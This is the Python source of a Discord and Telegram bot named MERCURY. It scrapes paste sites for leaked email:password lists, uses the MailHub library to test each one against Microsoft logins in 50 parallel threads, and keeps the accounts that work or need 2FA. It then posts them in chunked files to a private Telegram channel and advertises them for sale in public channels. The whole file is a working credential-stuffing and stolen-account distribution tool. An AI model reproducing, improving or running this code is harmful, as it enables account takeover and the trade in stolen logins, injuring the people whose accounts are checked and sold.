"""
MERCURY — Discord Bot
Scrapes Pasteview every 30 seconds, posts to 3 Discord channels + Telegram.
"""

import asyncio
import io
import json
import logging
import os
import random
import re
import time
from datetime import datetime, timezone
from pathlib import Path

import aiohttp
import concurrent.futures
from mailhub import MailHub

import discord
from discord.ext import commands, tasks
from discord import app_commands
from playwright.async_api import async_playwright

# ─── CONFIG ──────────────────────────────────────────────────────────────────
DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]
TELEGRAM_PUBLIC_CHAT  = os.environ["TELEGRAM_PUBLIC_CHAT"]
TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
OWNER_ID           = int(os.environ["OWNER_ID"])

CHECK_INTERVAL   = 30
CHECKER_THREADS  = 50
PAGES_TO_SCAN    = 5
ARCHIVE_URL      = "https://pasteview.com/paste-archive"
PASTEDPW_URL     = "https://pasted.pw/recent.php"
SEEN_FILE        = "seen_urls.json"
EMPTY_SCAN_ALERT = 10
KEYWORDS         = ["hotmail", "hits", "mixed"]
BLACKLIST        = ["omegle", "teens", "bro", "sis", "sister", "brother", "incest", "minor", "underage"]

# ─── LOGGING ─────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("mercury")

# ─── STATE ───────────────────────────────────────────────────────────────────
start_time = time.time()
stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
scan_lock  = asyncio.Lock()

private_post_count = 0  # counts private channel posts, public update every 10
recent_filenames   = []  # tracks last 10 posted filenames for public update

# ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
toggles = {
    "scanning":        True,   # master on/off for scanning
    "telegram":        True,   # post to private telegram
    "telegram_public": True,   # post update message to public telegram
    "owner_dm":        True,   # DM owner on new file
}

def load_seen() -> set:
    if Path(SEEN_FILE).exists():
        try:
            with open(SEEN_FILE) as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_seen(seen: set):
    try:
        with open(SEEN_FILE, "w") as f:
            json.dump(list(seen), f)
    except Exception as e:
        log.error(f"Failed to save seen URLs: {e}")

posted_urls: set = load_seen()

# ─── CREDENTIAL VALIDATION ───────────────────────────────────────────────────
EMOJI_RE = re.compile(
    "["
    u"\U0001F600-\U0001F64F"
    u"\U0001F300-\U0001F5FF"
    u"\U0001F680-\U0001F9FF"
    u"\U00002600-\U000027BF"
    u"\U0001FA00-\U0001FA6F"
    u"\U0001FA70-\U0001FAFF"
    u"\U00002702-\U000027B0"
    "]+", flags=re.UNICODE
)
JUNK_DOMAINS   = ("t.me", "telegram.me", "discord.gg", "http://", "https://")
VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")

def is_valid_combo(line: str) -> bool:
    if not line or len(line) > 200 or "|" in line:
        return False
    if EMOJI_RE.search(line) or any(d in line.lower() for d in JUNK_DOMAINS):
        return False
    if ":" not in line:
        return False
    parts = line.split(":", 1)
    email, password = parts[0].strip(), parts[1].strip()
    if not password or len(password) < 3:
        return False
    return bool(VALID_EMAIL_RE.match(email))

def extract_credentials(raw: str) -> list[str]:
    seen, lines = set(), []
    for line in raw.splitlines():
        line = line.strip()
        if line and is_valid_combo(line) and line not in seen:
            seen.add(line)
            lines.append(line)
    return lines


# ─── TELEGRAM ────────────────────────────────────────────────────────────────
async def send_telegram_file(text, filename: str):
    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    data = aiohttp.FormData()
    data.add_field("chat_id", TELEGRAM_CHAT)
    content = text.encode() if isinstance(text, str) else text
    data.add_field("document", content, filename=filename, content_type="application/octet-stream")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data) as resp:
                if resp.status != 200:
                    body = await resp.text()
                    log.error(f"Telegram API error {resp.status}: {body}")
                else:
                    log.info("Posted to Telegram")
    except Exception as e:
        log.error(f"Failed to send to Telegram: {e}")

# ─── BOT ─────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
bot  = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

async def extract_raw(page, url: str) -> str:
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="networkidle", timeout=15000)
            await page.wait_for_timeout(1500)

            raw = await page.evaluate("""
                () => {
                    if (window.ace) {
                        const editors = document.querySelectorAll('.ace_editor');
                        for (let ed of editors) {
                            try { const v = ace.edit(ed).getValue(); if (v && v.trim()) return v; } catch(e) {}
                        }
                    }
                    return null;
                }
            """)

            if not raw or not raw.strip():
                await page.evaluate("() => { const s = document.querySelector('.ace_scroller'); if (s) s.scrollTop = s.scrollHeight; }")
                await page.wait_for_timeout(800)
                lines = await page.query_selector_all("div.ace_line")
                raw   = "\n".join([(await l.text_content() or "").strip() for l in lines])

            if not raw or not raw.strip():
                pre = await page.query_selector("pre")
                if pre:
                    raw = await pre.text_content()

            if raw and raw.strip():
                return raw

        except Exception as e:
            log.error(f"Extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)

    return ""

# ─── CHECKER ─────────────────────────────────────────────────────────────────
def check_single(combo: str) -> tuple:
    """Returns (combo, 'VALID'|'2FA'|'INVALID')"""
    try:
        email, password = combo.split(":", 1)
        checker = MailHub()
        for _ in range(3):
            try:
                r = checker.loginMICROSOFT(email, password, None)
                if not r:
                    return (combo, "INVALID")
                if r[0] == "ok":
                    return (combo, "VALID")
                if r[0] == "nfa":
                    return (combo, "2FA")
                if r[0] == "retry":
                    continue
                return (combo, "INVALID")
            except Exception:
                import time; time.sleep(0.5)
        return (combo, "INVALID")
    except Exception:
        return (combo, "INVALID")


async def check_combos(combos: list, status_msg=None) -> tuple:
    """Run combos through checker. Returns (valid_list, invalid_count)."""
    if not combos:
        return [], 0
    log.info(f"Checking {len(combos)} combos with {CHECKER_THREADS} threads...")
    if status_msg:
        try:
            await status_msg.edit(content=f"🔄 Checking {len(combos)} combos...")
        except Exception:
            pass
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
        futures = [loop.run_in_executor(pool, check_single, combo) for combo in combos]
        results = await asyncio.gather(*futures)
    valid   = [combo for combo, status in results if status in ("VALID", "2FA")]
    invalid = sum(1 for combo, status in results if status == "INVALID")
    log.info(f"Checking done — {len(valid)} valid / {invalid} invalid")
    if status_msg:
        try:
            await status_msg.edit(content=f"✅ {len(valid)} valid / {invalid} invalid from {len(combos)} combos")
        except Exception:
            pass
    return valid, invalid


# ─── PASTED.PW ───────────────────────────────────────────────────────────────
async def scrape_pastedpw(pages: int = 5) -> list[dict]:
    """Scrape pasted.pw recent page using aiohttp."""
    found = []
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    async with aiohttp.ClientSession(headers=headers) as sess:
        for page_num in range(1, pages + 1):
            url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
            try:
                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    html = await r.text(errors="ignore")
                # Extract paste IDs and titles from anchor tags
                matches = re.findall(r'href="view\.php\?id=(\d+)"[^>]*>\s*([^<]+?)\s*</a>', html)
                for paste_id, title in matches:
                    title = title.strip()
                    if any(k in title.lower() for k in KEYWORDS):
                        if not any(b in title.lower() for b in BLACKLIST):
                            found.append({
                                "title": title,
                                "url": f"https://pasted.pw/view.php?id={paste_id}",
                                "source": "pasted.pw"
                            })
                log.info(f"pasted.pw page {page_num}: {len(found)} match(es) so far")
            except Exception as e:
                log.error(f"pasted.pw page {page_num} failed: {e}")
    return found


async def extract_pastedpw(page, url: str) -> str:
    """Extract combo text from a pasted.pw paste page."""
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=20000)
            await page.wait_for_timeout(1500)
            # Try getting text from the paste content area
            raw = await page.evaluate("""
                () => {
                    const pre = document.querySelector('pre');
                    if (pre) return pre.innerText;
                    const ta = document.querySelector('textarea');
                    if (ta) return ta.value;
                    const div = document.querySelector('.paste-content');
                    if (div) return div.innerText;
                    return null;
                }
            """)
            if raw and raw.strip():
                return raw
        except Exception as e:
            log.error(f"pasted.pw extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)
    return ""


# ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor_loop():
    if not toggles["scanning"]:
        return

    if scan_lock.locked():
        log.info("Scan already in progress, skipping this cycle")
        return

    async with scan_lock:
        stats["scans"] += 1
        log.info(f"Running scan #{stats['scans']}...")

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
            )
            page = await browser.new_page()

            try:
                # ── Step 1: load archive ───────────────────────────────────
                for attempt in range(3):
                    try:
                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
                        await page.wait_for_timeout(2000)
                        break
                    except Exception as e:
                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
                        if attempt == 2:
                            log.error("Archive failed after 3 attempts, skipping scan")
                            return
                        await asyncio.sleep(3)

                # ── Step 2: scrape pages ───────────────────────────────────
                found = []
                for page_num in range(1, PAGES_TO_SCAN + 1):
                    if page_num > 1:
                        navigated = False
                        buttons   = await page.query_selector_all("button")
                        for btn in buttons:
                            text = await btn.text_content()
                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
                                disabled  = await btn.get_attribute("disabled")
                                aria_dis  = await btn.get_attribute("aria-disabled")
                                if disabled is not None or aria_dis == "true":
                                    break
                                await btn.click()
                                await page.wait_for_timeout(2000)
                                navigated = True
                                break
                        if not navigated:
                            break

                    matches = await page.evaluate("""
                        (keywords) => {
                            const results = [];
                            for (const a of document.querySelectorAll('a')) {
                                const text = (a.innerText || a.textContent || '').toLowerCase();
                                if (keywords.some(k => text.includes(k))) {
                                    const href = a.href;
                                    if (href
                                        && !href.includes('/paste-archive')
                                        && !href.includes('/new')
                                        && !href.endsWith('/')
                                        && href !== window.location.href) {
                                        results.push({
                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
                                            url: href,
                                            source: 'pasteview'
                                        });
                                    }
                                }
                            }
                            return results;
                        }
                    """, KEYWORDS)
                    log.info(f"Page {page_num}: {len(matches)} match(es)")
                    found.extend(matches)

                # ── Also scrape pasted.pw ─────────────────────────────
                try:
                    pw_found = await scrape_pastedpw(PAGES_TO_SCAN)
                    found.extend(pw_found)
                except Exception as e:
                    log.error(f"pasted.pw scrape failed: {e}")

                # Deduplicate and filter blacklisted titles
                seen_this_run = set()
                pastes        = []
                for item in found:
                    if item["url"] in seen_this_run:
                        continue
                    if any(b in item["title"].lower() for b in BLACKLIST):
                        log.info(f"Skipping blacklisted paste: {item['title']}")
                        continue
                    seen_this_run.add(item["url"])
                    # Ensure source field is preserved
                    if "source" not in item:
                        item["source"] = "pasteview"
                    pastes.append(item)

                stats["total_pastes"] += len(pastes)
                pv_count = sum(1 for p in pastes if p.get("source") == "pasteview")
                pw_count = sum(1 for p in pastes if p.get("source") == "pasted.pw")
                log.info(f"Total pastes: {len(pastes)} (pasteview: {pv_count}, pasted.pw: {pw_count})")

                # ── Step 4: filter new pastes & mark seen ─────────────────
                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
                if not new_pastes:
                    stats["empty_scans"] += 1
                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
                        try:
                            owner = await bot.fetch_user(OWNER_ID)
                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
                        except Exception as e:
                            log.error(f"Failed to DM owner: {e}")
                    return

                stats["empty_scans"] = 0
                for p in new_pastes:
                    posted_urls.add(p["url"])
                save_seen(posted_urls)
                log.info(f"{len(new_pastes)} new paste(s) detected")

                # ── Step 6: extract creds & post to channel 3 ─────────────
                try:
                    combined        = []

                    for item in new_pastes[:5]:
                        url = item["url"]
                        log.info(f"Extracting from {url}")
                        if item.get("source") == "pasted.pw":
                            raw = await extract_pastedpw(page, url)
                        else:
                            raw = await extract_raw(page, url)
                        if raw:
                            creds = extract_credentials(raw)
                            if creds:
                                combined.append("\n".join(creds))
                                stats["total_combos"] += len(creds)
                                log.info(f"✓ {len(creds)} valid combos from {url}")
                            else:
                                log.info(f"No valid combos in {url}")
                        else:
                            log.info(f"No content extracted from {url}")


                    if combined:
                        # Flatten all creds
                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
                        random.shuffle(all_raw)

                        # Determine label
                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
                        if "hotmail" in title_lower_check:
                            label = "hotmail"
                        elif "hits" in title_lower_check:
                            label = "hits"
                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
                            label = "mix"
                        else:
                            label = "content"

                        # Run checker for hotmail and hits only
                        invalid_count = 0
                        if label in ("hotmail", "hits"):
                            try:
                                status_msg = await bot.get_channel(
                                    int(os.environ.get("CONTENT_CHANNEL_ID", "0")) or None
                                ) and None or None
                            except Exception:
                                status_msg = None
                            all_raw, invalid_count = await check_combos(all_raw, status_msg)
                            if not all_raw:
                                log.info("No valid hits after checking, skipping post")
                                combined = []

                        # Determine quality rating
                        total_checked = len(all_raw) + invalid_count
                        if total_checked > 0 and len(all_raw) > invalid_count:
                            quality = "UHQ"
                        else:
                            quality = "HQ"

                        # Split into random chunks of 100-1500 lines
                        chunks = []
                        remaining = all_raw[:]
                        while remaining:
                            size = random.randint(min(100, len(remaining)), min(1500, len(remaining)))
                            chunks.append(remaining[:size])
                            remaining = remaining[size:]

                        log.info(f"Split {len(all_raw)} combos into {len(chunks)} file(s) [{quality}]")

                    if combined:
                        # DM owner
                        if toggles["owner_dm"]:
                            try:
                                owner = await bot.fetch_user(OWNER_ID)
                                await owner.send(f"✅ New {label.upper()} [{quality}] detected — {len(all_raw)} combos in {len(chunks)} file(s)")
                            except Exception as e:
                                log.error(f"Failed to DM owner: {e}")

                        # Telegram — post all chunks
                        if toggles["telegram"]:
                            tg_header = (
                                f"WAR CLOUD PRIVATE {label.upper()}\n"
                                "------------------------\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                            )
                            for chunk in chunks:
                                fname = f"[ PVT ] [ {quality} ] [ {len(chunk)} ] [ {label.upper()} ].txt"
                                await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                await asyncio.sleep(0.5)

                            if toggles["telegram_public"]:
                                private_post_count_ref = globals()
                                private_post_count_ref["private_post_count"] += 1
                                for chunk in chunks:
                                    private_post_count_ref["recent_filenames"].append(f"[ PVT ] [ {quality} ] [ {len(chunk)} ] [ {label.upper()} ].txt")
                                log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                if private_post_count_ref["private_post_count"] >= 2:
                                    private_post_count_ref["private_post_count"] = 0
                                    file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
                                    private_post_count_ref["recent_filenames"] = []
                                    pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                    promo_path = os.path.join("/app", "promo.png")
                                    async with aiohttp.ClientSession() as sess:
                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
                                            try:
                                                if os.path.exists(promo_path):
                                                    form = aiohttp.FormData()
                                                    form.add_field("chat_id", pub_chat)
                                                    form.add_field("caption", pub_text)
                                                    with open(promo_path, "rb") as img:
                                                        form.add_field("photo", img.read(), filename="promo.png", content_type="image/png")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=form)
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendPhoto failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update with image to {pub_chat}")
                                                else:
                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                                        json={"chat_id": pub_chat, "text": pub_text})
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendMessage failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update to {pub_chat}")
                                            except Exception as e:
                                                log.error(f"Failed to post public update to {pub_chat}: {e}")


                    else:
                        log.info("Nothing to post to content channel")

                except Exception as e:
                    log.error(f"Could not post to content channel: {e}")

            except Exception as e:
                log.error(f"Monitor loop error: {e}")
                stats["empty_scans"] += 1
            finally:
                await browser.close()


@monitor_loop.before_loop
async def before_monitor():
    await bot.wait_until_ready()


@tasks.loop(seconds=60)
async def watchdog():
    """Restart monitor loop if it dies."""
    if not monitor_loop.is_running():
        log.warning("Monitor loop was dead, restarting...")
        monitor_loop.start()


@watchdog.before_loop
async def before_watchdog():
    await bot.wait_until_ready()

# ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
@tree.command(name="scrape", description="Manually trigger a scrape right now")
@app_commands.describe(pages="Number of archive pages to scan (default: 5)")
async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
    await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
    await monitor_loop()
    await interaction.followup.send("✅ Done.", ephemeral=True)


@tree.command(name="toggle", description="Enable or disable a bot feature")
@app_commands.describe(feature="Feature to toggle")
@app_commands.choices(feature=[
    app_commands.Choice(name="scanning",        value="scanning"),
    app_commands.Choice(name="telegram",        value="telegram"),
    app_commands.Choice(name="telegram_public", value="telegram_public"),
    app_commands.Choice(name="owner_dm",        value="owner_dm"),
])
async def cmd_toggle(interaction: discord.Interaction, feature: str):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Only the owner can use this.", ephemeral=True)
        return
    toggles[feature] = not toggles[feature]
    state = "✅ ON" if toggles[feature] else "❌ OFF"
    await interaction.response.send_message(f"`{feature}` is now {state}", ephemeral=True)


@tree.command(name="toggles", description="Show current status of all toggles")
async def cmd_toggles(interaction: discord.Interaction):
    lines = [f"{'✅' if v else '❌'} `{k}`" for k, v in toggles.items()]
    await interaction.response.send_message("\n".join(lines), ephemeral=True)



@tree.command(name="stats", description="Show bot stats")
async def cmd_stats(interaction: discord.Interaction):
    uptime_secs      = int(time.time() - start_time)
    hours, remainder = divmod(uptime_secs, 3600)
    minutes, seconds = divmod(remainder, 60)
    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="Uptime",       value=f"{hours}h {minutes}m {seconds}s", inline=True)
    embed.add_field(name="Scans Run",    value=str(stats["scans"]),               inline=True)
    embed.add_field(name="Pastes Found", value=str(stats["total_pastes"]),        inline=True)
    embed.add_field(name="Combos Found", value=str(stats["total_combos"]),        inline=True)
    embed.add_field(name="URLs Tracked", value=str(len(posted_urls)),             inline=True)
    embed.add_field(name="Check Every",  value=f"{CHECK_INTERVAL}s",             inline=True)
    await interaction.response.send_message(embed=embed)

# ─── EVENTS ──────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await tree.sync()
        log.info(f"Synced {len(synced)} slash command(s)")
    except Exception as e:
        log.error(f"Failed to sync commands: {e}")

    # Delete Telegram webhook so it doesnt process channel messages
    try:
        async with aiohttp.ClientSession() as sess:
            await sess.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true")
            log.info("Telegram webhook cleared")
    except Exception as e:
        log.error(f"Failed to clear Telegram webhook: {e}")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
    else:
        log.info("Monitor already running after reconnect")
    if not watchdog.is_running():
        watchdog.start()

@bot.event
async def on_resumed():
    log.info("Discord session resumed")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info("Monitor restarted after resume")
    if not watchdog.is_running():
        watchdog.start()

# ─── RUN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN, log_handler=None)
